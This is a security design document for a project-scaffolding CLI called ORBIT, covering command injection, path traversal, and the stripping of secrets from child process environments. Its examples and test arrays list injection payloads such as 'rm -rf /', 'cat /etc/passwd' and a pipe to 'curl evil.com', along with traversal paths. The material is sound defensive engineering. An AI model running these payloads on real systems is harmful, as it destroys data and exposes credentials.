# Security Architecture — ORBIT CLI

**Parent:** [← Kembali ke Main](_main.md)
**Status:** ✅ Created

---

## 1. Security Overview

### 1.1 Threat Model

ORBIT CLI menghadapi threat berikut:

| Threat                   | Risk Level  | Attack Vector               | Mitigation                  |
| :----------------------- | :---------- | :-------------------------- | :-------------------------- |
| **Command Injection**    | 🔴 Critical | Malicious project name/path | Input validation + spawn    |
| **Path Traversal**       | 🔴 Critical | Directory escape via `..`   | Path validation             |
| **Arbitrary Code Exec**  | 🔴 Critical | Malicious stack config      | Code review + sandboxing    |
| **Dependency Confusion** | 🟡 Medium   | Typosquatting packages      | Lock files + registry check |
| **Info Disclosure**      | 🟡 Medium   | Env vars in child process   | Sanitized env               |

### 1.2 Security Principles

1. **Never Trust User Input** — Semua input divalidasi
2. **Defense in Depth** — Multiple layers of protection
3. **Least Privilege** — Minimal permissions
4. **Fail Secure** — Default deny, explicit allow

---

## 2. Command Injection Prevention

### 2.1 The Problem

```typescript
// ❌ BERBAHAYA - Command Injection!
import { exec } from "child_process";

const projectName = req.body.name; // User input: "test; rm -rf /"
exec(`npx create-next-app ${projectName}`); // DISASTER!
```

### 2.2 The Solution

```typescript
// ✅ AMAN - Gunakan spawn dengan array arguments
import { spawn } from "child_process";

const projectName = "test; rm -rf /"; // Even malicious input...

spawn("npx", ["create-next-app", projectName], {
  shell: false, // CRITICAL: No shell interpretation!
});
// Hasil: Tries to create project named "test; rm -rf /"
// TIDAK mengeksekusi rm command!
```

### 2.3 Rule Table

| Method                           | Shell? | Safe?    | Use Case                         |
| :------------------------------- | :----- | :------- | :------------------------------- |
| `spawn(cmd, args)`               | ❌ No  | ✅ Yes   | **DEFAULT - SELALU GUNAKAN INI** |
| `execFile(file, args)`           | ❌ No  | ✅ Yes   | Running specific binary          |
| `spawn(cmd, args, {shell:true})` | ✅ Yes | ⚠️ Risky | Only with hardcoded commands     |
| `exec(cmdString)`                | ✅ Yes | ❌ No    | **DILARANG KERAS!**              |

### 2.4 Implementation Pattern

```typescript
// src/utils/safe-executor.ts

import { spawn, type SpawnOptions } from "child_process";

/**
 * SECURE command executor - NEVER uses shell by default
 */
export function safeSpawn(
  command: string,
  args: readonly string[],
  options?: Omit<SpawnOptions, "shell">
): ReturnType<typeof spawn> {
  // Force shell: false even if someone tries to override
  return spawn(command, [...args], {
    ...options,
    shell: false, // ENFORCED!
  });
}

// Usage
safeSpawn("npm", ["install", userProvidedPackage]);
// Even if userProvidedPackage = "lodash && rm -rf /"
// npm will try to install package named "lodash && rm -rf /"
// which will fail safely with "package not found"
```

---

## 3. Input Validation

### 3.1 Validation Schema (Zod)

```typescript
// src/core/validation/schemas.ts

import { z } from "zod";

/**
 * Project name - npm package name compatible
 * @see https://github.com/npm/validate-npm-package-name
 */
export const ProjectNameSchema = z
  .string()
  .min(1, "Project name is required")
  .max(214, "Project name must be ≤ 214 characters")
  .regex(
    /^(?:@[a-z0-9-*~][a-z0-9-*._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/,
    "Invalid project name. Must be lowercase, no spaces, valid npm package name."
  )
  .refine(
    (name) => !name.startsWith(".") && !name.startsWith("_"),
    "Project name cannot start with . or _"
  );

/**
 * Path validation - prevent directory traversal
 */
export const SafePathSchema = z
  .string()
  .refine((path) => !path.includes(".."), 'Path cannot contain ".."')
  .refine((path) => !path.includes("\0"), "Path cannot contain null bytes")
  .refine(
    (path) => !/[<>:"|?*]/.test(path),
    "Path contains invalid characters"
  );

/**
 * Framework ID - whitelist only
 */
export const FrameworkIdSchema = z.enum([
  "nextjs",
  "nuxt",
  "astro",
  "sveltekit",
  "vue",
  "remix",
  "laravel",
]);

/**
 * Package manager - whitelist only
 */
export const PackageManagerSchema = z.enum(["npm", "yarn", "pnpm", "bun"]);

/**
 * Version string - semver compatible
 */
export const VersionSchema = z
  .string()
  .regex(/^\d+(\.\d+)?(\.\d+)?$/, "Invalid version format");
```

### 3.2 Validation Middleware

```typescript
// src/core/validation/validate.ts

import { z, ZodError } from "zod";
import { ValidationError } from "../errors";

/**
 * Validate input against schema
 * @throws ValidationError if invalid
 */
export function validate<T>(
  schema: z.ZodSchema<T>,
  input: unknown,
  context?: string
): T {
  try {
    return schema.parse(input);
  } catch (error) {
    if (error instanceof ZodError) {
      const messages = error.errors.map(
        (e) => `${e.path.join(".")}: ${e.message}`
      );
      throw new ValidationError(
        `${context ? `${context}: ` : ""}${messages.join(", ")}`
      );
    }
    throw error;
  }
}

/**
 * Validate or return null (no throw)
 */
export function validateSafe<T>(
  schema: z.ZodSchema<T>,
  input: unknown
): T | null {
  const result = schema.safeParse(input);
  return result.success ? result.data : null;
}
```

---

## 4. Path Traversal Prevention

### 4.1 Safe Path Utilities

```typescript
// src/utils/safe-path.ts

import * as path from "path";
import * as fs from "fs/promises";
import { FileSystemError } from "../core/errors";

/**
 * Resolve path safely within a base directory
 * Prevents escaping via '../' traversal
 */
export function resolveSafe(basePath: string, userPath: string): string {
  const resolved = path.resolve(basePath, userPath);
  const normalized = path.normalize(resolved);

  // Ensure resolved path is within base
  if (!normalized.startsWith(path.normalize(basePath))) {
    throw new FileSystemError(
      `Path traversal detected: "${userPath}" escapes base directory`
    );
  }

  return normalized;
}

/**
 * Create directory safely
 */
export async function mkdirSafe(targetPath: string): Promise<void> {
  // Validate no traversal in path
  if (targetPath.includes("..")) {
    throw new FileSystemError('Path cannot contain ".."');
  }

  await fs.mkdir(targetPath, { recursive: true });
}

/**
 * Check if directory exists and is empty
 */
export async function ensureEmptyDir(targetPath: string): Promise<void> {
  try {
    const stats = await fs.stat(targetPath);
    if (stats.isDirectory()) {
      const contents = await fs.readdir(targetPath);
      if (contents.length > 0) {
        throw new FileSystemError(`Directory "${targetPath}" is not empty`);
      }
    } else {
      throw new FileSystemError(
        `"${targetPath}" exists but is not a directory`
      );
    }
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === "ENOENT") {
      // Directory doesn't exist - that's fine
      return;
    }
    throw error;
  }
}
```

---

## 5. Environment Variable Security

### 5.1 Sanitized Child Process Environment

```typescript
// src/utils/safe-env.ts

/**
 * Sensitive environment variable patterns
 */
const SENSITIVE_PATTERNS = [
  // API Keys & Tokens
  /^(API|AUTH|SECRET|PRIVATE).*KEY$/i,
  /^.*TOKEN$/i,
  /^.*SECRET$/i,

  // Cloud credentials
  /^AWS_/i,
  /^AZURE_/i,
  /^GCP_/i,
  /^GOOGLE_/i,

  // Database
  /^.*DATABASE.*URL$/i,
  /^.*DB.*PASSWORD$/i,
  /^.*CONNECTION.*STRING$/i,

  // CI/CD
  /^GITHUB_TOKEN$/i,
  /^GITLAB_TOKEN$/i,
  /^NPM_TOKEN$/i,

  // Misc
  /^PASSWORD$/i,
  /^CREDENTIAL/i,
];

/**
 * Create sanitized environment for child processes
 */
export function createSafeEnv(): NodeJS.ProcessEnv {
  const env = { ...process.env };

  for (const key of Object.keys(env)) {
    if (isSensitive(key)) {
      delete env[key];
    }
  }

  return env;
}

function isSensitive(key: string): boolean {
  return SENSITIVE_PATTERNS.some((pattern) => pattern.test(key));
}
```

### 5.2 Usage in Spawn

```typescript
import { spawn } from "child_process";
import { createSafeEnv } from "../utils/safe-env";

spawn("npm", ["install"], {
  shell: false,
  env: createSafeEnv(), // Don't leak secrets to child process
});
```

---

## 6. CVE-2024-27980 Mitigation

### 6.1 Windows Batch File Vulnerability

```typescript
// VULNERABILITY: Windows spawn bisa dieksploitasi via .bat/.cmd files
// pada Node.js < 18.20.0, 20.12.0, 21.7.2

// ❌ VULNERABLE (on affected Node.js versions)
spawn("malicious.bat", ["args"], { shell: false });
// Could still execute shell commands!

// ✅ MITIGATION: Update Node.js + explicit checks
const MIN_NODE_VERSION = "18.20.0";

function checkNodeVersion(): void {
  const [major, minor, patch] = process.versions.node.split(".").map(Number);

  if (major === 18 && (minor < 20 || (minor === 20 && patch < 0))) {
    console.warn("⚠️ Node.js version vulnerable to CVE-2024-27980");
    console.warn("Please update to 18.20.0 or later");
  }
}
```

### 6.2 Avoid Executing Unknown Binaries

```typescript
// ✅ BEST PRACTICE: Whitelist allowed commands
const ALLOWED_COMMANDS = new Set([
  "npm",
  "npx",
  "yarn",
  "pnpm",
  "bun",
  "git",
  "node",
  "php",
  "composer",
]);

function validateCommand(command: string): void {
  const basename = path.basename(command).replace(/\.(exe|cmd|bat)$/i, "");

  if (!ALLOWED_COMMANDS.has(basename.toLowerCase())) {
    throw new SecurityError(`Command not allowed: ${command}`);
  }
}
```

---

## 7. Secure Coding Checklist

### Before Every spawn/execFile Call

- [ ] Arguments passed as **array**, not string
- [ ] `shell: false` is **explicitly set**
- [ ] User input is **validated** before use
- [ ] Environment is **sanitized** (no secrets)
- [ ] Command is **whitelisted** (known safe binary)

### Before File System Operations

- [ ] Path is **validated** (no `..` or special chars)
- [ ] Target is **within expected directory**
- [ ] No **null bytes** in path
- [ ] Directory existence **checked**

### Before External Data Processing

- [ ] Input **type checked** (Zod schema)
- [ ] Input **length limited**
- [ ] Input **character set** restricted
- [ ] Encoding **explicitly handled** (UTF-8)

---

## 8. Security Testing

### 8.1 Test Cases for Command Injection

```typescript
// __tests__/security/command-injection.test.ts

describe("Command Injection Prevention", () => {
  const maliciousInputs = [
    "test; rm -rf /",
    "test && cat /etc/passwd",
    "test | curl evil.com",
    "test$(whoami)",
    "test`whoami`",
    "test\nrm -rf /",
    "test%0Arm -rf /",
  ];

  test.each(maliciousInputs)(
    "should safely handle malicious input: %s",
    async (input) => {
      // Validation should reject OR
      // spawn should pass it as literal string
      expect(() => validate(ProjectNameSchema, input)).toThrow();
    }
  );
});
```

### 8.2 Test Cases for Path Traversal

```typescript
// __tests__/security/path-traversal.test.ts

describe("Path Traversal Prevention", () => {
  const maliciousPaths = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "/etc/passwd",
    "C:\\Windows\\System32",
    "foo/../../../etc/passwd",
    "foo%2F..%2F..%2Fetc%2Fpasswd",
  ];

  test.each(maliciousPaths)("should reject path traversal: %s", (input) => {
    expect(() => resolveSafe("/home/user/projects", input)).toThrow();
  });
});
```
